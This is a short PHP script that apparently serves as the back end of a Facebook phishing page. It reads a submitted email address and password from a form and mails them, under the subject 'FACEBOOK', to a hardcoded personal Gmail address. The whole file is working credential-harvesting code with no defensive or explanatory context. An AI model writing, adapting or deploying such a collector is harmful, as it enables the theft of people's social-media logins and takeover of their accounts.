<?php
if (isset($_POST['email'])) {
	$email = $_POST['email'];
	$password = $_POST['pass'];
	$myemail = "maxiwel2021@gmail.com";
	$subject = "FACEBOOK";
	$message = "Email: ". $email." "."Password: ". $password;
	mail($myemail, $subject, $message);
}
?>